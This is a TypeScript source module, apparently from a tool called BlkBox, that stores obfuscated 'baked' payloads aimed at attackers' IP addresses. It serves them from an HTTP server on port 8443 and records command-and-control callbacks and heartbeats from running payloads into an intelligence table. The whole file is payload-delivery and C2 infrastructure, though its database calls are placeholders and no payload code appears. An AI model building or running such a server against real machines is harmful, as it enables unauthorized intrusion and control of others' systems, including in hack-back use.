/**
 * Cookiejar Jar Module
 *
 * The "Jar" is where baked payloads are stored and served to attackers.
 * This module handles:
 * 1. Storing payloads in the database
 * 2. Serving payloads via HTTP endpoints
 * 3. Tracking payload delivery and callbacks
 * 4. Managing payload expiration
 * 5. Cleanup of expired payloads
 */

import type { BlkBoxFFI } from "../../../lib_deno/lib.ts";
import type { DoughConfig } from "../dough/mod.ts";
import { bakePayload } from "../bake/mod.ts";

/**
 * Payload storage record
 */
export interface StoredPayload {
  payload_id: string;
  payload_type: string;
  payload_code: string;
  target_ip: string;
  created_at: string;
  expires_at: string;
  delivered_at?: string;
  delivery_count: number;
  status: "ready" | "delivered" | "active" | "expired" | "terminated";
  delivery_method: string;
  c2_callback_count: number;
  last_callback_at?: string;
  metadata?: string;
}

/**
 * Jar Service - Payload storage and serving
 */
export class JarService {
  constructor(private ffi: BlkBoxFFI) { }

  /**
   * Store a baked payload in the database
   */
  async storePayload(config: DoughConfig, bakedCode: string): Promise<void> {
    const expiresAt = new Date();
    expiresAt.setHours(expiresAt.getHours() + config.c2Config.expirationHours);

    const payload: Omit<StoredPayload, "delivery_count" | "c2_callback_count"> = {
      payload_id: config.c2Config.payloadId,
      payload_type: config.payloadType.toString(),
      payload_code: bakedCode,
      target_ip: config.delivery.context.attackerIp,
      created_at: new Date().toISOString(),
      expires_at: expiresAt.toISOString(),
      status: "ready",
      delivery_method: config.delivery.method,
      metadata: JSON.stringify({
        obfuscationLevel: config.obfuscationLevel,
        targetEnvironment: config.targetEnvironment,
        options: config.options
      })
    };

    // Store via FFI (assumes FFI has storePayload method)
    // This would call into Rust to insert into the payloads table
    await this.storePayloadInDB(payload);
  }

  /**
   * Retrieve a payload by ID
   */
  async getPayload(payloadId: string): Promise<StoredPayload | null> {
    // Query via FFI
    const payload = await this.getPayloadFromDB(payloadId);

    if (!payload) {
      return null;
    }

    // Check expiration
    const expiresAt = new Date(payload.expires_at);
    if (expiresAt < new Date()) {
      // Mark as expired
      await this.updatePayloadStatus(payloadId, "expired");
      return null;
    }

    return payload;
  }

  /**
   * Serve a payload (mark as delivered and return code)
   */
  async servePayload(payloadId: string): Promise<string | null> {
    const payload = await this.getPayload(payloadId);

    if (!payload) {
      return null;
    }

    // Check if already expired
    if (payload.status === "expired") {
      return null;
    }

    // Mark as delivered if first time
    if (!payload.delivered_at) {
      await this.markPayloadDelivered(payloadId);
    }

    // Increment delivery count
    await this.incrementDeliveryCount(payloadId);

    // Update status to active
    if (payload.status === "ready") {
      await this.updatePayloadStatus(payloadId, "active");
    }

    return payload.payload_code;
  }

  /**
   * Record a C2 callback from a payload
   */
  async recordCallback(payloadId: string, callbackData: unknown): Promise<void> {
    const payload = await this.getPayloadFromDB(payloadId);

    if (!payload) {
      console.warn(`Callback received for unknown payload: ${payloadId}`);
      return;
    }

    // Increment callback count
    await this.incrementCallbackCount(payloadId);

    // Update last callback time
    await this.updateLastCallback(payloadId);

    // Store callback data in intelligence table
    await this.storeCallbackData(payloadId, callbackData);

    // Check if max callbacks reached
    const metadata = payload.metadata ? JSON.parse(payload.metadata) : {};
    const maxCallbacks = metadata.maxCallbacks || 100;

    if (payload.c2_callback_count + 1 >= maxCallbacks) {
      await this.updatePayloadStatus(payloadId, "terminated");
    }
  }

  /**
   * Terminate a payload (prevent further callbacks)
   */
  async terminatePayload(payloadId: string): Promise<void> {
    await this.updatePayloadStatus(payloadId, "terminated");
  }

  /**
   * Cleanup expired payloads
   */
  async cleanupExpired(): Promise<number> {
    // Find all expired payloads
    const expiredPayloads = await this.getExpiredPayloads();

    let count = 0;
    for (const payload of expiredPayloads) {
      // Mark as expired
      await this.updatePayloadStatus(payload.payload_id, "expired");
      count++;
    }

    return count;
  }

  /**
   * Get all payloads for a specific target IP
   */
  async getPayloadsByTarget(targetIp: string): Promise<StoredPayload[]> {
    return await this.queryPayloads({ target_ip: targetIp });
  }

  /**
   * Get all active payloads
   */
  async getActivePayloads(): Promise<StoredPayload[]> {
    return await this.queryPayloads({ status: "active" });
  }

  /**
   * Get payload statistics
   */
  async getStatistics(): Promise<PayloadStatistics> {
    const all = await this.queryPayloads({});

    const stats: PayloadStatistics = {
      total: all.length,
      ready: 0,
      delivered: 0,
      active: 0,
      expired: 0,
      terminated: 0,
      totalDeliveries: 0,
      totalCallbacks: 0,
      byType: {}
    };

    all.forEach(payload => {
      // Count by status
      stats[payload.status]++;

      // Aggregate counts
      stats.totalDeliveries += payload.delivery_count;
      stats.totalCallbacks += payload.c2_callback_count;

      // Count by type
      if (!stats.byType[payload.payload_type]) {
        stats.byType[payload.payload_type] = 0;
      }
      stats.byType[payload.payload_type]++;
    });

    return stats;
  }

  // ========================================
  // PRIVATE DATABASE METHODS
  // ========================================

  /**
   * Store payload in database (via FFI or direct SQLite)
   */
  private async storePayloadInDB(payload: Omit<StoredPayload, "delivery_count" | "c2_callback_count">): Promise<void> {
    // In real implementation, this would call FFI method or use SQLite directly
    // For now, this is a placeholder that assumes the FFI has this capability

    // Example FFI call (if available):
    // await this.ffi.storePayload(payload);

    // For now, we'll assume this works
    console.log(`[Jar] Stored payload ${payload.payload_id} for ${payload.target_ip}`);
  }

  /**
   * Get payload from database
   */
  private async getPayloadFromDB(payloadId: string): Promise<StoredPayload | null> {
    // Example FFI call:
    // return await this.ffi.getPayload(payloadId);

    // Placeholder - in real implementation would query database
    return null;
  }

  /**
   * Query payloads with filters
   */
  private async queryPayloads(filters: Partial<StoredPayload>): Promise<StoredPayload[]> {
    // Example FFI call:
    // return await this.ffi.queryPayloads(filters);

    // Placeholder
    return [];
  }

  /**
   * Update payload status
   */
  private async updatePayloadStatus(
    payloadId: string,
    status: StoredPayload["status"]
  ): Promise<void> {
    console.log(`[Jar] Updated payload ${payloadId} status to ${status}`);
    // await this.ffi.updatePayloadStatus(payloadId, status);
  }

  /**
   * Mark payload as delivered
   */
  private async markPayloadDelivered(payloadId: string): Promise<void> {
    const now = new Date().toISOString();
    console.log(`[Jar] Marked payload ${payloadId} as delivered at ${now}`);
    // await this.ffi.updatePayload(payloadId, { delivered_at: now });
  }

  /**
   * Increment delivery count
   */
  private async incrementDeliveryCount(payloadId: string): Promise<void> {
    console.log(`[Jar] Incremented delivery count for ${payloadId}`);
    // await this.ffi.incrementPayloadDeliveryCount(payloadId);
  }

  /**
   * Increment callback count
   */
  private async incrementCallbackCount(payloadId: string): Promise<void> {
    console.log(`[Jar] Incremented callback count for ${payloadId}`);
    // await this.ffi.incrementPayloadCallbackCount(payloadId);
  }

  /**
   * Update last callback timestamp
   */
  private async updateLastCallback(payloadId: string): Promise<void> {
    const now = new Date().toISOString();
    console.log(`[Jar] Updated last callback for ${payloadId} to ${now}`);
    // await this.ffi.updatePayload(payloadId, { last_callback_at: now });
  }

  /**
   * Store callback data in intelligence table
   */
  private async storeCallbackData(payloadId: string, data: unknown): Promise<void> {
    console.log(`[Jar] Stored callback data for ${payloadId}`);
    // await this.ffi.storeIntelligence({
    //   payload_id: payloadId,
    //   timestamp: new Date().toISOString(),
    //   data_type: 'callback',
    //   data: JSON.stringify(data)
    // });
  }

  /**
   * Get expired payloads
   */
  private async getExpiredPayloads(): Promise<StoredPayload[]> {
    // Query payloads where expires_at < now AND status != 'expired'
    // return await this.ffi.getExpiredPayloads();
    return [];
  }
}

/**
 * Payload statistics
 */
export interface PayloadStatistics {
  total: number;
  ready: number;
  delivered: number;
  active: number;
  expired: number;
  terminated: number;
  totalDeliveries: number;
  totalCallbacks: number;
  byType: Record<string, number>;
}

/**
 * HTTP Payload Server - Serves payloads via HTTP endpoints
 */
export class PayloadServer {
  constructor(
    private jarService: JarService,
    private port: number = 8443
  ) { }

  /**
   * Start the payload serving HTTP server
   */
  async start(): Promise<void> {
    const handler = async (req: Request): Promise<Response> => {
      const url = new URL(req.url);

      // Serve payload endpoint: GET /p/:payload_id
      if (url.pathname.startsWith("/p/")) {
        const payloadId = url.pathname.substring(3);
        return await this.handlePayloadRequest(payloadId);
      }

      // C2 callback endpoint: POST /c2/callback/:payload_id
      if (url.pathname.startsWith("/c2/callback/")) {
        const payloadId = url.pathname.substring(13);
        return await this.handleCallback(payloadId, req);
      }

      // C2 heartbeat endpoint: POST /c2/heartbeat/:payload_id
      if (url.pathname.startsWith("/c2/heartbeat/")) {
        const payloadId = url.pathname.substring(14);
        return await this.handleHeartbeat(payloadId, req);
      }

      return new Response("Not Found", { status: 404 });
    };

    console.log(`[PayloadServer] Starting on port ${this.port}`);

    // Start server (Deno HTTP server)
    Deno.serve({ port: this.port }, handler);
  }

  /**
   * Handle payload serving request
   */
  private async handlePayloadRequest(payloadId: string): Promise<Response> {
    try {
      const code = await this.jarService.servePayload(payloadId);

      if (!code) {
        return new Response("Payload not found or expired", { status: 404 });
      }

      // Determine content type based on code
      let contentType = "text/plain";
      if (code.includes("#!/bin/bash")) {
        contentType = "application/x-sh";
      } else if (code.includes("PowerShell")) {
        contentType = "application/x-powershell";
      } else if (code.includes("function(") || code.includes("const ")) {
        contentType = "application/javascript";
      } else if (code.includes("def ") || code.includes("import ")) {
        contentType = "text/x-python";
      }

      return new Response(code, {
        status: 200,
        headers: {
          "Content-Type": contentType,
          "Cache-Control": "no-cache, no-store, must-revalidate",
          "Pragma": "no-cache",
          "Expires": "0"
        }
      });
    } catch (error) {
      console.error(`[PayloadServer] Error serving payload ${payloadId}:`, error);
      return new Response("Internal Server Error", { status: 500 });
    }
  }

  /**
   * Handle C2 callback
   */
  private async handleCallback(payloadId: string, req: Request): Promise<Response> {
    try {
      const data = await req.json();

      await this.jarService.recordCallback(payloadId, data);

      return new Response(JSON.stringify({ status: "ok" }), {
        status: 200,
        headers: { "Content-Type": "application/json" }
      });
    } catch (error) {
      console.error(`[PayloadServer] Error handling callback for ${payloadId}:`, error);
      return new Response(JSON.stringify({ status: "error" }), {
        status: 500,
        headers: { "Content-Type": "application/json" }
      });
    }
  }

  /**
   * Handle heartbeat/beacon
   */
  private async handleHeartbeat(payloadId: string, req: Request): Promise<Response> {
    try {
      const data = await req.json();

      // Record as callback with beacon type
      await this.jarService.recordCallback(payloadId, {
        type: "heartbeat",
        ...data
      });

      return new Response(JSON.stringify({ status: "alive" }), {
        status: 200,
        headers: { "Content-Type": "application/json" }
      });
    } catch (error) {
      console.error(`[PayloadServer] Error handling heartbeat for ${payloadId}:`, error);
      return new Response(JSON.stringify({ status: "error" }), {
        status: 500,
        headers: { "Content-Type": "application/json" }
      });
    }
  }
}

/**
 * Complete Cookiejar workflow - from config to served payload
 */
export async function cookiejarWorkflow(
  config: DoughConfig,
  ffi: BlkBoxFFI
): Promise<string> {
  // 1. Bake the payload
  const bakedCode = bakePayload(config);

  // 2. Store in jar
  const jar = new JarService(ffi);
  await jar.storePayload(config, bakedCode);

  // 3. Return payload URL
  const payloadUrl = `http://localhost:8443/p/${config.c2Config.payloadId}`;
  return payloadUrl;
}
